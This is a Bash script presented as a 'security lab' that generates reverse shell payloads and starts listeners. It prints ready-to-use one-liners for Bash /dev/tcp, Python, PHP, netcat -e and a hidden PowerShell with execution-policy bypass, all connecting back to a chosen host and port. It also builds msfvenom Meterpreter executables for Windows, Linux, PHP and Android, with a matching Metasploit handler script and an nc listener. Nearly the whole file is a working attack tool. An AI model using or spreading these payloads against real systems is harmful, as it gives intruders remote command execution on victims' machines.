#!/bin/bash

# ==========================================
# PROJECT: REVERSE CONNECTION SECURITY LAB
# AUTHOR: NAMAN DHYANI
# PLATFORM: KALI LINUX
# ==========================================

GREEN='\033[1;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
PURPLE='\033[1;35m'
NC='\033[0m'

LOG_FILE="connection_logs.txt"

clear

# Banner
echo -e "${CYAN}"
echo "╔══════════════════════════════════════════╗"
echo "║       REVERSE CONNECTION SECURITY LAB    ║"
echo "║   Msfvenom Generator & Netcat Listener   ║"
echo "╚══════════════════════════════════════════╝"
echo -e "${NC}"

# Check dependencies
echo -e "${BLUE}[*] Checking system dependencies...${NC}"
for cmd in nc msfvenom; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
        echo -e "${YELLOW}[!] Warning/Optional dependency missing: $cmd (Required only if using msfvenom)${NC}"
    fi
done
echo -e "${GREEN}[✔] Dependency check completed.${NC}\n"

# Get Local Listener IP (LHOST)
read -rp "[-] Enter Local IP (LHOST): " LHOST

if [[ ! "$LHOST" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
    echo -e "${RED}[✖] Error: Invalid IP address format!${NC}"
    exit 1
fi

# Get Local Port (LPORT)
read -rp "[-] Enter Local Port (LPORT, 1024-65535): " LPORT

if ! [[ "$LPORT" =~ ^[0-9]+$ ]] ||
   (( LPORT < 1024 || LPORT > 65535 )); then
    echo -e "${RED}[✖] Error: Invalid port number!${NC}"
    exit 1
fi

echo -e "\n------------------------------------------"
echo -e " ${YELLOW}LHOST (Listener IP) :${NC} $LHOST"
echo -e " ${YELLOW}LPORT (Port)        :${NC} $LPORT"
echo -e "------------------------------------------\n"

# Payload Type Selection
echo -e "${BLUE}[*] Select Target Payload Type:${NC}"
echo "  1) Bash (TCP)"
echo "  2) Python 3"
echo "  3) PHP"
echo "  4) PowerShell"
echo "  5) Netcat"
echo "  6) Metasploit (msfvenom -> msfconsole)"
echo ""
read -rp "Enter choice [1-6]: " CHOICE

case $CHOICE in
    1)
        PAYLOAD="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
        LANG_NAME="Bash"
        echo -e "\n${GREEN}[✔] Generated $LANG_NAME Reverse Shell Payload:${NC}"
        echo -e "${PURPLE}------------------------------------------${NC}"
        echo -e "${CYAN}$PAYLOAD${NC}"
        echo -e "${PURPLE}------------------------------------------${NC}"
        
        read -rp "Do you want to save this payload to 'payload.txt'? (y/n): " SAVE_CHOICE
        if [[ "$SAVE_CHOICE" =~ ^[Yy]$ ]]; then
            echo "$PAYLOAD" > payload.txt
            echo -e "${GREEN}[✔] Payload successfully saved to payload.txt${NC}"
        fi
        ;;
    2)
        PAYLOAD="python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"$LHOST\",$LPORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn(\"/bin/bash\")'"
        LANG_NAME="Python 3"
        echo -e "\n${GREEN}[✔] Generated $LANG_NAME Reverse Shell Payload:${NC}"
        echo -e "${PURPLE}------------------------------------------${NC}"
        echo -e "${CYAN}$PAYLOAD${NC}"
        echo -e "${PURPLE}------------------------------------------${NC}"
        
        read -rp "Do you want to save this payload to 'payload.txt'? (y/n): " SAVE_CHOICE
        if [[ "$SAVE_CHOICE" =~ ^[Yy]$ ]]; then
            echo "$PAYLOAD" > payload.txt
            echo -e "${GREEN}[✔] Payload successfully saved to payload.txt${NC}"
        fi
        ;;
    3)
        PAYLOAD="php -r '\$sock=fsockopen(\"$LHOST\",$LPORT); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        LANG_NAME="PHP"
        echo -e "\n${GREEN}[✔] Generated $LANG_NAME Reverse Shell Payload:${NC}"
        echo -e "${PURPLE}------------------------------------------${NC}"
        echo -e "${CYAN}$PAYLOAD${NC}"
        echo -e "${PURPLE}------------------------------------------${NC}"
        
        read -rp "Do you want to save this payload to 'payload.txt'? (y/n): " SAVE_CHOICE
        if [[ "$SAVE_CHOICE" =~ ^[Yy]$ ]]; then
            echo "$PAYLOAD" > payload.txt
            echo -e "${GREEN}[✔] Payload successfully saved to payload.txt${NC}"
        fi
        ;;
    4)
        PAYLOAD="powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$LHOST\",$LPORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ascii).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
        LANG_NAME="PowerShell"
        echo -e "\n${GREEN}[✔] Generated $LANG_NAME Reverse Shell Payload:${NC}"
        echo -e "${PURPLE}------------------------------------------${NC}"
        echo -e "${CYAN}$PAYLOAD${NC}"
        echo -e "${PURPLE}------------------------------------------${NC}"
        
        read -rp "Do you want to save this payload to 'payload.txt'? (y/n): " SAVE_CHOICE
        if [[ "$SAVE_CHOICE" =~ ^[Yy]$ ]]; then
            echo "$PAYLOAD" > payload.txt
            echo -e "${GREEN}[✔] Payload successfully saved to payload.txt${NC}"
        fi
        ;;
    5)
        PAYLOAD="nc $LHOST $LPORT -e /bin/bash"
        LANG_NAME="Netcat"
        echo -e "\n${GREEN}[✔] Generated $LANG_NAME Reverse Shell Payload:${NC}"
        echo -e "${PURPLE}------------------------------------------${NC}"
        echo -e "${CYAN}$PAYLOAD${NC}"
        echo -e "${PURPLE}------------------------------------------${NC}"
        
        read -rp "Do you want to save this payload to 'payload.txt'? (y/n): " SAVE_CHOICE
        if [[ "$SAVE_CHOICE" =~ ^[Yy]$ ]]; then
            echo "$PAYLOAD" > payload.txt
            echo -e "${GREEN}[✔] Payload successfully saved to payload.txt${NC}"
        fi
        ;;
    6)
        echo -e "\n${BLUE}[*] Select Msfvenom Target Platform:${NC}"
        echo "  1) Windows x64 Executable (.exe)"
        echo "  2) Linux x64 ELF Binary (.elf)"
        echo "  3) PHP Script (.php)"
        echo "  4) Android APK (.apk)"
        echo ""
        read -rp "Enter choice [1-4]: " MSF_CHOICE

        case $MSF_CHOICE in
            1)
                MSF_PAYLOAD="windows/x64/meterpreter/reverse_tcp"
                EXT="exe"
                FORMAT="exe"
                ;;
            2)
                MSF_PAYLOAD="linux/x64/meterpreter/reverse_tcp"
                EXT="elf"
                FORMAT="elf"
                ;;
            3)
                MSF_PAYLOAD="php/meterpreter/reverse_tcp"
                EXT="php"
                FORMAT="raw"
                ;;
            4)
                MSF_PAYLOAD="android/meterpreter/reverse_tcp"
                EXT="apk"
                FORMAT="raw"
                ;;
            *)
                MSF_PAYLOAD="windows/x64/meterpreter/reverse_tcp"
                EXT="exe"
                FORMAT="exe"
                ;;
        esac

        FILENAME="payload.$EXT"
        RC_FILE="handler.rc"

        echo -e "\n${PURPLE}[*] Generating msfvenom payload ($MSF_PAYLOAD)...${NC}"
        msfvenom -p "$MSF_PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$FORMAT" -o "$FILENAME"

        if [[ $? -eq 0 ]]; then
            echo -e "${GREEN}[✔] Successfully generated payload: $FILENAME${NC}"
            
            # Generate Metasploit Resource Script (.rc) for instant msfconsole handling
            echo "use exploit/multi/handler" > "$RC_FILE"
            echo "set PAYLOAD $MSF_PAYLOAD" >> "$RC_FILE"
            echo "set LHOST $LHOST" >> "$RC_FILE"
            echo "set LPORT $LPORT" >> "$RC_FILE"
            echo "exploit" >> "$RC_FILE"
            
            echo -e "${GREEN}[✔] Successfully generated Metasploit handler script: $RC_FILE${NC}"
            echo -e "${CYAN}[*] To start listener via msfconsole run: msfconsole -r $RC_FILE${NC}"
        else
            echo -e "${RED}[✖] Failed to generate payload via msfvenom!${NC}"
        fi
        
        echo "$(date) | Generated Msfvenom payload ($MSF_PAYLOAD) | LHOST: $LHOST | LPORT: $LPORT" >> "$LOG_FILE"
        exit 0
        ;;
    *)
        echo -e "${RED}[✖] Invalid choice! Defaulting to Bash.${NC}"
        PAYLOAD="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
        ;;
esac

echo "$(date) | Generated $LANG_NAME payload | LHOST: $LHOST | LPORT: $LPORT" >> "$LOG_FILE"

# Option to start netcat listener immediately (for non-msfvenom payloads)
if [[ "$CHOICE" -ne 6 ]]; then
    echo ""
    read -rp "Do you want to start the netcat listener now? (y/n): " START_LISTENER
    if [[ "$START_LISTENER" =~ ^[Yy]$ ]]; then
        echo -e "\n${PURPLE}[*] Initializing interactive TCP listener...${NC}"
        echo -e "${YELLOW}[!] Status: Binding listener to port $LPORT (Press Ctrl+C to abort)...\n${NC}"
        echo "$(date) | Listener started | Port: $LPORT" >> "$LOG_FILE"
        nc -lvnp "$LPORT"
    fi
fi

echo -e "\n${BLUE}==========================================${NC}"
echo -e "${GREEN}[✔] Lab session completed successfully.${NC}"
echo -e "${BLUE}==========================================${NC}"
